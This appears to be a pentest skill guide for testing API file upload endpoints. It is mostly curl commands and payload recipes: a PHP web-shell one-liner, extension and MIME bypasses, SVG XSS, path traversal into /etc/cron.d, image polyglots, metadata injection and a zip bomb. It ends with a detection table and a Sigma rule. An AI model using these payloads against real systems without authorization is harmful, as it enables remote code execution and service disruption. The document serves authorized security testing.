<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
---
name: testing-api-file-upload-vulnerabilities
description: >-
  Test API file upload endpoints for unrestricted file type, size bypass,
  path traversal, malicious content injection, and server-side execution
  vulnerabilities.
domain: cybersecurity
subdomain: api-security
tags:
  - file-upload
  - api-security
  - owasp-api8
  - unrestricted-upload
  - content-type-bypass
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1059"]
  owasp-api: ["API8"]
  cwe: ["CWE-434"]
  tools: ["curl", "burp-suite", "nuclei", "exiftool"]
---

## Overview

API file upload vulnerabilities allow attackers to upload malicious files that
may lead to remote code execution, stored XSS, denial of service, or data
exfiltration. Testing covers MIME type validation bypass, extension filtering,
content inspection evasion, path traversal in filenames, and size limit bypass.

## Prerequisites

- Tools: `curl`, `burp-suite`, `nuclei`, `exiftool`, `python3`
- Authorized testing engagement with defined scope
- Test account with upload permissions
- Sample payload files (polyglots, web shells, oversized files)

## Key Concepts

- **MIME type bypass**: Mismatched Content-Type header vs actual file content
- **Extension bypass**: Double extensions, null bytes, case manipulation
- **Polyglot files**: Files valid as multiple formats (e.g., GIFAR — GIF + JAR)
- **Path traversal**: Manipulating filename to write outside upload directory
- **Content validation**: Server-side magic byte and content inspection

## Workflow

### Step 1: Enumerate Upload Endpoints

```bash
# Discover upload endpoints from OpenAPI spec
grep -E 'multipart/form-data|application/octet-stream' openapi.yaml

# Identify upload parameters from traffic
grep -rE 'Content-Disposition: form-data.*filename=' proxy_logs/
```

### Step 2: Test MIME Type Validation Bypass

```bash
# Upload PHP shell with image Content-Type
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php;type=image/jpeg" \
  -o /dev/null -w "%{http_code}"

# Upload with mismatched extension and MIME
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.php.jpg;type=image/jpeg"

# Test SVG with embedded JavaScript
cat > xss.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
EOF
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@xss.svg;type=image/svg+xml"
```

### Step 3: Test Extension Filtering Bypass

```bash
# Double extension bypass
for EXT in "shell.php.jpg" "shell.php5" "shell.phtml" \
  "shell.php%00.jpg" "shell.PhP" "shell.php.bak"; do
  echo "Testing: $EXT"
  curl -s -X POST "https://target.com/api/upload" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@$EXT" -o /dev/null -w "  HTTP %{http_code}\n"
done

# Null byte injection (older systems)
printf '<?php system($_GET["c"]); ?>' > /tmp/shell.php
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/shell.php;filename=image.php%00.jpg"
```

### Step 4: Test Path Traversal in Filename

```bash
# Directory traversal in filename parameter
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=../../../etc/cron.d/backdoor"

# URL-encoded traversal
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=..%2F..%2F..%2Ftmp%2Ftest.txt"
```

### Step 5: Test Content Validation and Magic Bytes

```bash
# Prepend valid image header to PHP payload
printf '\xff\xd8\xff\xe0' > polyglot.php.jpg
cat shell.php >> polyglot.php.jpg

# Create GIF polyglot
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif

# Test with exiftool metadata injection
exiftool -Comment='<?php system($_GET["c"]); ?>' clean.jpg -o payload.jpg
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.jpg"
```

### Step 6: Test Size Limit and DoS

```bash
# Generate oversized file
dd if=/dev/zero of=/tmp/large.bin bs=1M count=500

# Upload to test size limits
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/large.bin" -o /dev/null -w "%{http_code}"

# Zip bomb test
python3 -c "
import zipfile, os
with zipfile.ZipFile('/tmp/bomb.zip','w',zipfile.ZIP_DEFLATED) as z:
    z.writestr('bomb.txt', 'A' * (10 * 1024 * 1024))
"
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/bomb.zip"
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Executable MIME type upload | WAF logs | Upload of php/exe/sh content types |
| Path traversal in filename | Application logs | `../` sequences in upload filenames |
| Magic byte mismatch | Content scanner | File header doesn't match declared type |
| Oversized upload attempts | API gateway | Requests exceeding configured size limits |

```yaml
title: Suspicious File Upload With Executable Extension
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects upload requests containing executable file extensions
logsource:
  category: webserver
detection:
  selection:
    cs-method: POST
    cs-uri-stem|contains: '/upload'
  filter_ext:
    cs-uri-query|re: '\.(php|asp|jsp|exe|sh|py|pl|cgi|phtml)'
  condition: selection and filter_ext
falsepositives:
  - Legitimate developer uploading scripts through authorized channels
level: high
tags:
  - attack.t1190
  - attack.initial_access
```

## Verification

- [ ] MIME type validation bypass tested
- [ ] Extension filtering bypass tested with multiple techniques
- [ ] Path traversal in filename parameter tested
- [ ] Content validation and magic byte bypass tested
- [ ] Size limit enforcement verified
- [ ] Uploaded files checked for server-side execution
- [ ] Results documented with evidence

## References

- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
